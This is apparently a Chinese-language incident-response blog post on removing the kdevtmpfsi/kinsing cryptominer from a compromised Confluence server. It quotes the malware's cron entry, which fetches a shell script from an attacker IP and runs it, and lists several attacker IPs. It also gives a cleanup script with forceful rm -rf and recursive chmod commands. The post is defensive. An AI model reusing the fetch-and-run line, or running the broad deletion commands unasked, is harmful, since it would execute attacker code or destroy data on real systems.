---
title: 利用 Confluence 漏洞被挂挖矿木马 kdevtmpfsi 后处理方案
date: 2021-09-03
---


## 现象

服务器的 CPU 突然被异常进程 `kdevtmpfsi` 占满

``` bash
  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
10346 conflue+  20   0 3481244   2.3g    272 S  1196 19.9   6290:48 kdevtmpfsi
```

## 检查

- 查看异常进程

``` bash
# ps -ef | grep kdevtmpfsi
root      7770 14501  0 23:35 pts/1    00:00:00 grep --color=auto kdevtmpfsi
conflue+ 10346     1 99 13:03 ?        5-05:38:24 /tmp/kdevtmpfsi

# systemctl status 10346
● session-364.scope - Session 364 of user root
   Loaded: loaded (/run/systemd/system/session-364.scope; static; vendor preset: disabled)
  Drop-In: /run/systemd/system/session-364.scope.d
           └─50-After-systemd-logind\x2eservice.conf, 50-After-systemd-user-sessions\x2eservice.conf, 50-Description.conf, 50-SendSIGHUP.conf, 50-Slice.conf, 50-TasksMax.conf
   Active: active (abandoned) since Tue 2021-01-26 02:42:54 EST; 7 months 5 days ago
   CGroup: /user.slice/user-0.slice/session-364.scope
           ├─ 9963 /tmp/kinsing         # Confluence 关联异常进程
           ├─10346 /tmp/kdevtmpfsi      # Confluence 关联异常进程
           ├─14586 /opt/atlassian/confluence/jre//bin/java ...
           └─14851 /opt/atlassian/confluence/jre/bin/java ...

# ll /tmp
...
-rwxr-x---. 1 confluence confluence  3930448 Sep  2 01:48 kdevtmpfsi      # 异常文件 
-rwxrwxrwx. 1 confluence confluence 14643200 Sep  2 01:46 kinsing         # 异常文件
-rwxrwxrwx. 1 confluence confluence    26800 Sep  1 13:02 libsystem.so    # 异常文件
-rw-------. 1 confluence confluence        0 Sep  1 13:02 linux.lock      # 异常文件
...
```

- 异常进程访问了异常/国外 IP

``` bash
# netstat –natp
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
...
tcp        0      0 xx.xx.xx.xx:41302       95.181.179.88:80        ESTABLISHED 10346/kdevtmpfsi   # 95.181.179.88 为国外 IP
...
```

- 异常定时任务

``` bash
# crontab -l -u confluence
* * * * * curl http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
```


## 处理

- 删除异常定时任务
- 删除异常进程
- 设置文件夹访问权限

上述操作可参考以下脚本：

``` bash
crontab -r -u confluence
ps -aux | grep kinsing |grep -v grep |awk '{print $2}'
ps -aux | grep kdevtmpfsi |grep -v grep |awk '{print $2}'
ps -aux | grep kinsing |grep -v grep |awk '{print $11}'
ps -aux | grep kdevtmpfsi |grep -v grep |awk '{print $11}'
ps -aux | grep kinsing |grep -v grep |awk  '{print "rm -rf " $11}' |sh
ps -aux | grep kdevtmpfsi |grep -v grep |awk  '{print "rm -rf " $11}' |sh
ps -aux | grep kinsing |grep -v grep |awk  '{print "kill -9 " $2}' |sh
ps -aux | grep kdevtmpfsi |grep -v grep |awk  '{print "kill -9 " $2}' |sh

rm -rf /var/tmp/kinsing
rm -rf /tmp/libsystem.so
rm -rf /tmp/linux.lock

chmod -R 700 /tmp
chmod -R 700 /var/tmp

find / -name kdevtmpfsi
find / -name kinsing
```

- 禁止服务器访问异常 IP，参考：

```
195.3.146.118
142.44.191.122
185.92.74.42
217.12.221.244
93.189.43.3
185.154.53.140
```

- 关闭 Confluence 外网访问


## 参考

https://www.jianshu.com/p/9699251ad1d7

http://www.pangxieke.com/linux/virus-of-kdevtmpfsi.html

https://paper.seebug.org/884/

https://www.cnblogs.com/zhangjiahao/p/12634930.html

https://www.jianshu.com/p/60bbe86a7b33

https://guanjia.qq.com/news/n3/2581.html

https://www.cnblogs.com/hack404/p/11464890.html
